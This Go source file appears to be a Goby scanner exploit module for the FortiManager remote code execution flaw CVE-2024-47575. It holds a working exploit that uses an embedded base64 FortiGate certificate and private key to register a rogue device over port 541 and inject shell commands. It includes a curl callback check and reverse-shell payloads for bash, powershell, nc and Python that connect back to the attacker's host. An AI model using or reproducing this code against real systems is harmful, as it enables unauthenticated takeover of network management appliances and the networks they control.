package exploits

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Fortinet FortiManager Remote Code Execution Vulnerability（CVE-2024-47575）",
    "Description": "<p>Fortinet is the only provider offering centralized unified management to establish consistent security in complex hybrid environments. The centralized management covers FortiGate next-generation firewalls deployed on-premises and in the cloud, as well as secure SD-WAN, secure WLAN/LAN, Universal ZTNA, and FortiSASE. The fgfmd daemon in FortiManager lacks critical authentication functionality, allowing unauthenticated remote attackers to use valid FortiGate certificates to register unauthorized devices in FortiManager. Exploiting this vulnerability enables remote execution of arbitrary commands or code on FortiManager, potentially leading to sensitive information disclosure or full control of managed devices and FortiManager, further compromising the entire network.</p>",
    "Product": "FortiManager-VM64",
    "Homepage": "https://www.fortinet.com/",
    "DisclosureDate": "2024-10-23",
    "PostTime": "2024-12-13",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"FortiManager-VM64: None\"  && title=\"FortiManager-VM64: None\" ",
    "GobyQuery": "body=\"FortiManager-VM64: None\"  && title=\"FortiManager-VM64: None\" ",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands without authorization, potentially leading to full system control and further compromising the security of network devices.</p>",
    "Recommendation": "<p>The vendor has released an updated version. Affected users are advised to upgrade to the latest version: <a href=\"https://www.fortinet.com/products/management/fortimanager\">https://www.fortinet.com/products/management/fortimanager</a></p>",
    "References": [
        "https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-47575"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Fortinet FortiManager 远程代码执行漏洞（CVE-2024-47575）",
            "Product": "FortiManager-VM64",
            "Description": "<p>Fortinet是唯一一家提供集中统一管理的供应商，可在复杂的混合环境中设置一致的安全性。集中统一的管理涵盖在本地和云中部署FortiGate下一代防火墙，以及安全SD-WAN、安全WLAN/LAN、Universal ZTNA和FortiSASE。FortiManager fgfmd守护进程中缺少关键功能的身份验证，未经身份验证的远程攻击者可以使用有效的 FortiGate 证书在 FortiManager 中注册未授权设备，利用该漏洞在 FortiManager 上远程执行任意命令或代码，成功利用可能导致敏感信息泄露或完全控制托管设备和 FortiManager，进而进一步入侵整个网络。</p>",
            "Recommendation": "<p>目前官方已有可更新版本，建议受影响用户升级至最新版本：<a href=\"https://www.fortinet.com/products/management/fortimanager\">https://www.fortinet.com/products/management/fortimanager</a></p>",
            "Impact": "<p>攻击者可以利用该漏洞在未经授权的情况下执行任意系统命令，可能导致系统被完全控制，进一步威胁网络设备的安全性。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Fortinet FortiManager Remote Code Execution Vulnerability（CVE-2024-47575）",
            "Product": "FortiManager-VM64",
            "Description": "<p>Fortinet is the only provider offering centralized unified management to establish consistent security in complex hybrid environments. The centralized management covers FortiGate next-generation firewalls deployed on-premises and in the cloud, as well as secure SD-WAN, secure WLAN/LAN, Universal ZTNA, and FortiSASE. The fgfmd daemon in FortiManager lacks critical authentication functionality, allowing unauthenticated remote attackers to use valid FortiGate certificates to register unauthorized devices in FortiManager. Exploiting this vulnerability enables remote execution of arbitrary commands or code on FortiManager, potentially leading to sensitive information disclosure or full control of managed devices and FortiManager, further compromising the entire network.</p>",
            "Recommendation": "<p>The vendor has released an updated version. Affected users are advised to upgrade to the latest version: <a href=\"https://www.fortinet.com/products/management/fortimanager\">https://www.fortinet.com/products/management/fortimanager</a></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands without authorization, potentially leading to full system control and further compromising the security of network devices.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecNoEcho",
        "vulurl": "define|variable| {{{scheme}}}://{{{host}}}:541/"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9977"
}`

	//tcp发http请求包，
	tcpHttpConnection5362341475752024 := func(hostInfo *httpclient.FixUrl, command string) (string, error) {
		sendmsg := func(conn net.Conn, request []byte, recv bool) ([]byte, error) {
			message := make([]byte, 8+len(request))
			binary.BigEndian.PutUint32(message[0:4], 0x36e01100)
			binary.BigEndian.PutUint32(message[4:8], uint32(len(request)+8))
			copy(message[8:], request)
			_, err := conn.Write(message)
			if err != nil {
				return nil, err
			}
			if !recv {
				return nil, err
			}
			hdr := make([]byte, 8)
			_, err = conn.Read(hdr)
			if err != nil {
				return nil, err
			}
			if len(hdr) != 8 {
				return hdr, err
			}
			_ = binary.BigEndian.Uint32(hdr[0:4])
			size := binary.BigEndian.Uint32(hdr[4:8])
			data := make([]byte, size)
			_, err = conn.Read(data)
			if err != nil {
				return nil, err
			}

			return data, err
		}
		cert, err := base64.StdEncoding.DecodeString("LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR5akNDQXJLZ0F3SUJBZ0lFQXVRWW5qQU5CZ2txaGtpRzl3MEJBUXNGQURDQm9ERUxNQWtHQTFVRUJoTUMKVlZNeEV6QVJCZ05WQkFnVENrTmhiR2xtYjNKdWFXRXhFakFRQmdOVkJBY1RDVk4xYm01NWRtRnNaVEVSTUE4RwpBMVVFQ2hNSVJtOXlkR2x1WlhReEhqQWNCZ05WQkFzVEZVTmxjblJwWm1sallYUmxJRUYxZEdodmNtbDBlVEVRCk1BNEdBMVVFQXhNSGMzVndjRzl5ZERFak1DRUdDU3FHU0liM0RRRUpBUllVYzNWd2NHOXlkRUJtYjNKMGFXNWwKZEM1amIyMHdIaGNOTWpReE1UQXpNVFExTlRBMFdoY05Nemd3TVRFNE1qSXpORE01V2pDQm5URUxNQWtHQTFVRQpCaE1DVlZNeEV6QVJCZ05WQkFnTUNrTmhiR2xtYjNKdWFXRXhFakFRQmdOVkJBY01DVk4xYm01NWRtRnNaVEVSCk1BOEdBMVVFQ2d3SVJtOXlkR2x1WlhReEVqQVFCZ05WQkFzTUNVWnZjblJwUjJGMFpURVpNQmNHQTFVRUF3d1EKUmtkV1RVVldWMGM0V1UxVU0xSTJNekVqTUNFR0NTcUdTSWIzRFFFSkFSWVVjM1Z3Y0c5eWRFQm1iM0owYVc1bApkQzVqYjIwd2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUM5VHNsS0UwY0tZSVd4CjJOcFBBOEdoL01HblJMdVVhbCtFb3hKVnc3Sm9FQnlqRmF4RWZYOHpHdEh2Tkw4ZlNHS3B6a2Z0bHNWSldManQKT1psbUdBTE5Gd05CMWY0RXpkTDNqV2Y4Yml5U3NISFR0WUlYMHY3dE1mc1c5a1M2OFpQSm5VYVlPSUFMaytXMApRNEVRVGNRVU9sbG0vcGM4S1BTYnVmY2t6ci8vaWswa0ZhdmUzZjBYUml6N2FTUUh2WjZoRGZEVnlwMXJjbDBjCkVKVzU4NC9kdGtMUUN5T2JUNTdEeFJ2U0lEdHlXLy9EVEdSTmZKV3p3T0cvaFVSKzRMUW56VmptUTdXUm14UnoKUmtWVHQ4ZzB4b211VDE4cUNRT2w0MDhlTnBTdFZTdmV6Q0FyTHg1bXJMNWMvbkkyUzZaakRld2g5OUh5dnhTNQpLQ2JIUlBSYkFnTUJBQUdqRFRBTE1Ba0dBMVVkRXdRQ01BQXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBRUhiCnQ0dVR4SXVKTzZUbWNuVDROYXJMMlByUUx0a1NVOEFwWGR2V3BYeHBkWXRXOWNBQ3QwSFlIWnRtU1AyWGJRRGsKektuZncvNE9EbjQ4djRGTWZVTVM1RkU3a294T0RnWmY2YVZQN25ja0ovbUxTRkVzeWMveTZJZVpjdU5oT3FvUgpxdllZbHNjUWt0Mmt2cTcrRWVqQjJmZllHQUlWU0pnZ0ZzV3ZvZEgwOGFXc0EzY0NJVElMMjRzakh4K2ZRZHc2CnJiWTBKTGszK09McWVWQWYycDBDQnluWWtSTkFmVWEvRU9oTGc5UTFWdHM0U1J2NkRLaXlSclZMU0RtWDFXK1QKS01mVVo1WTAzaE5HTGFSSFpOUnh6R0JnQ0FFZFJYdVVTb25JNzFISW5pUnU1UTNpR0syWG9NUFozVjFHS2lKegpnSjZTTFpCWVhKZUpqeDE1empNPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==")
		key, err := base64.StdEncoding.DecodeString("LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb2dJQkFBS0NBUUVBdlU3SlNoTkhDbUNGc2RqYVR3UEJvZnpCcDBTN2xHcGZoS01TVmNPeWFCQWNveFdzClJIMS9NeHJSN3pTL0gwaGlxYzVIN1piRlNWaTQ3VG1aWmhnQ3pSY0RRZFgrQk0zUzk0MW4vRzRza3JCeDA3V0MKRjlMKzdUSDdGdlpFdXZHVHlaMUdtRGlBQzVQbHRFT0JFRTNFRkRwWlp2NlhQQ2owbTduM0pNNi8vNHBOSkJXcgozdDM5RjBZcysya2tCNzJlb1EzdzFjcWRhM0pkSEJDVnVmT1AzYlpDMEFzam0wK2V3OFViMGlBN2Nsdi93MHhrClRYeVZzOERodjRWRWZ1QzBKODFZNWtPMWtac1VjMFpGVTdmSU5NYUpyazlmS2drRHBlTlBIamFVclZVcjNzd2cKS3k4ZVpxeStYUDV5Tmt1bVl3M3NJZmZSOHI4VXVTZ214MFQwV3dJREFRQUJBb0lCQUVqT1pVSDArZ3gycE5TSwpkeU9PYVVrWWdZNElOREJYWE5jUk5Ic0JvYnE5LzVXRlAxUzBBMWl2UnZBOWxBZSsraHNlZDdGYm5CS2lhYlRxCnd5RnR1SjRSN0xIRVVFYWV0alY1RC9ZWWxWSHhSRVhNOS9TYnRHbWJJRnRyYVhHUWVXcy83cWVhaXp4b3JCNVIKRy9FZVIzd1VHTkF3dUE5dUhPMUxiMDZicVdIb3NHSW0wYk9zdFQxa1pnalRaQkN4RitITTlMOXhyMUNmOCs1OApKWFFGb3E0N3F5WWFVbXkwdVppNmNiRVExblBpeHNnOTU2bVZORDR0YkIxRHY3ajhkT0lLdm1CWExYWUxoakVPCkJ2VnE3NjVNKzg4K1RUUy9RQ1BpbVZSMjdFa292L1NFb2FBbVdMNkNqaWhyVGc4b0psQnFwVnZDU2I5eFRxaEcKaUJKN0dKRUNnWUVBNUZtcE5vYzg4bXhOcUVyUGFqaHI4eFd3Z1ZlZ2pGM0FOOFBLU1BldVlpSzk1MUZQdzdMZQpZblk1SEwvUW5tNVh2dG9TR2JmeXlEb3I5ZTBvTDNLMEN1SC9oL2MyOTJReC9FSVZHMDIwR0dFa3VoRmNYcEkyCk1sMDJsTVk3d1c0U0s1Zm5DZU5GekZWMlN1SHQ3ZkorZG4xYWtmR3pRWk50T3N4UXlyc2Z3V01DZ1lFQTFEcmwKcGxmcllTbFM4SEN1RWlHOU9WQWFLWHFBNWhqOHlDdytsTlJHOVlaQTFQT011RENhc1RPOC9QUXBGV3FMMi9hWQozSXFVbnc0THUwRm9pZ1BWZjJRM2l4WFA5UHNTOFY0SUh1aFR6K2pLdXpTNFNyeVEzR2R6eEZFaHIvT2liQmtQCjB6VkxYK1JZOGxrM3Qzc0FTbmk5WVJkTHlsYm1OWnFadEd1L3Jxa0NnWUJYbUYxazRYUHJ1c2YvYXRNdDkvN1EKL056OGdOVEJnNlVjdnlwMTJ5MDEwQVh4R2l2eThrYUVscjFKM2ZyMUMzYjFhMG5PTzlZU0lONkVORGxhR2pJZQppcHN2V1JIb3pMS3dCZGw2NDgvV0drMndZc0NBTnE0N202NDRXK0xJVEtVRHUvMlF1WElvOUErd29nSlhhTkpDCk9jdm9lRU0vUUlLQ0w2WStYcEhMNlFLQmdEaHVXTFg4VnJnRkZ1cWI2NDBpcjMvWHpyME10ODEzQTIvdVk4MkwKRERzb3NZQnVLaEtueWRvb1dhNGc5Zk9kMndabjhZbGl4OVhyRkM5OFd1R24xMU1DUU1xWXlDenB2Y1cwTFJDYQowZjVNZGV1RlB5T1FOQ3lHelg5NzJ5cy82d1kzTzcvN1FjbURuQ3NFa2c0VmhLUklxb0p3Z1ZTUityQnlKVUNXCkRlZlJBb0dBVTRhZStTUWFQdU13NlBKUDh2RFJ3SENnaGFNRmJmbjFSS2NEa3NVWHFhZndQU0licGhlanRMWGwKT0ROUjRUbnB2ZDJnOWllYkVHcGRBM0xjN1p5SFY3VnUwSVQ1eCtFQmRvT3Fwdk0yVGRlNHB4dStJeUVXM1ZHVAplZjBleG0yWUQ3SWNBenZUd1BKTXBiT0J4WnpNYkQ5TlQrTk5CamlXU0tLOTY0emN3TW89Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==")

		requestGetIP := []byte("get ip\r\nserialno=FGVMEVWG8YMT3R63\r\nmgmtid=00000000-0000-0000-0000-000000000000\r\nplatform=FortiGate-VM64\r\nfos_ver=700\r\nminor=2\r\npatch=2\r\nbuild=1255\r\nbranch=1255\r\nmaxvdom=2\r\nfg_ip=192.168.1.53\r\nhostname=FGVMEVWG8YMT3R63\r\nharddisk=yes\r\nbiover=04000002\r\nharddisk_size=30720\r\nlogdisk_size=30235\r\nmgmt_mode=normal\r\nenc_flags=0\r\nfirst_fmgid=\r\nprobe_mode=yes\r\nvdom=root\r\nintf=port1\r\n\x00")
		requestAuth := []byte("get auth\r\nserialno=FGVMEVWG8YMT3R63\r\nmgmtid=00000000-0000-0000-0000-000000000000\r\nplatform=FortiGate-60E\r\nfos_ver=700\r\nminor=2\r\npatch=4\r\nbuild=1396\r\nbranch=1396\r\nmaxvdom=2\r\nfg_ip=192.168.1.53\r\nhostname=FortiGate\r\nharddisk=yes\r\nbiover=04000002\r\nharddisk_size=30720\r\nlogdisk_size=30107\r\nmgmt_mode=normal\r\nenc_flags=0\r\nmgmtip=192.168.1.53\r\nmgmtport=443\r\n\x00")
		rand.Seed(time.Now().UnixNano())
		requestTemplate := []byte("get file_exchange\r\nlocalid=REPLACE_LOCAL_ID\r\nchan_window_sz=32768\r\ndeflate=gzip\r\nfile_exch_cmd=put_json_cmd\r\n\r\n\000")
		localID := []byte(strconv.Itoa(rand.Intn(900) + 100))
		requestFileExchange := bytes.Replace(requestTemplate, []byte("REPLACE_LOCAL_ID"), localID, 1)
		jsonPayload := fmt.Sprintf(`{
		"method": "exec",
		"id": 1,
		"params": [{
			"url": "um/som/export",
			"data": {
				"file": "` + fmt.Sprintf("`%s`", command) + `"
			}
		}]
		}`)
		requestChannelOpen := []byte("channel\r\nremoteid=REPLACE_REMOTE_ID\r\n\r\n\x00")
		requestChannelOpen = append(requestChannelOpen, []byte(fmt.Sprintf("%d", len(jsonPayload)))...)
		requestChannelOpen = append(requestChannelOpen, []byte("\n")...)
		requestChannelOpen = append(requestChannelOpen, []byte(jsonPayload)...)
		requestChannelOpen = append(requestChannelOpen, []byte("0\n")...)
		requestChannelClose := []byte("channel\r\naction=close\r\nremoteid=REPLACE_REMOTE_ID\r\n\r\n\x00")

		certPair, err := tls.X509KeyPair(cert, key)
		target := hostInfo.HostInfo
		colonIndex := strings.LastIndex(target, ":")
		if colonIndex != -1 {
			// 替换端口号部分
			target = target[:colonIndex+1] + "541"
		}
		conn, err := httpclient.GetTCPConn(target)
		if err != nil {
			return "", nil
		}

		// 设置超时时间，比如 10 秒
		timeoutDuration := 10 * time.Second
		conn.SetDeadline(time.Now().Add(timeoutDuration))
		conn = tls.Client(conn, &tls.Config{
			Certificates:       []tls.Certificate{certPair},
			InsecureSkipVerify: true,
		})

		defer conn.Close()
		// TCP 发包

		response, err := sendmsg(conn, requestGetIP, true)
		if err != nil {
			return "", err
		}
		response, err = sendmsg(conn, requestAuth, true)
		if err != nil {
			return "", err
		}
		response, err = sendmsg(conn, requestFileExchange, true)
		if err != nil {
			return "", err
		}
		re := regexp.MustCompile(`remote_id=(\d+)`)
		match := re.FindStringSubmatch(string(response))
		remoteId := match[1]
		if remoteId == "" {
			return "", err
		}
		requestChannelOpen = bytes.Replace(requestChannelOpen, []byte("REPLACE_REMOTE_ID"), []byte(remoteId), -1)
		response, err = sendmsg(conn, requestChannelOpen, false)
		requestChannelClose = bytes.Replace(requestChannelClose, []byte("REPLACE_REMOTE_ID"), []byte(remoteId), -1)
		response, err = sendmsg(conn, requestChannelClose, true)
		if err != nil {
			return "", err
		}
		return string(response), err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		// poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			tcpPayload := tcpHttpConnection5362341475752024
			vulURL := "/"
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			pocCommand := "curl http://" + checkUrl
			if isDomain {
				// pocCommand = "ping -c 1 " + checkUrl
				pocCommand = "curl " + checkUrl
			}
			target := hostInfo.HostInfo
			colonIndex := strings.LastIndex(target, ":")
			if colonIndex != -1 {
				// 替换端口号部分
				target = target[:colonIndex+1] + "541"
			}
			_, err := tcpPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				//
				ss.VulURL = hostInfo.Scheme() + "://" + target + vulURL
				return true
			}
			return false
		},
		// exp
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := tcpHttpConnection5362341475752024

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)

						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			Mode := goutils.B2S(ss.Params["Mode"])
			switch Mode {
			case "Command":
				//配置命令
				command := goutils.B2S(ss.Params["Command"])
				result, err := runPayload(expResult.HostInfo, command)
				if result == "" || err != nil {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "Reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["Reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
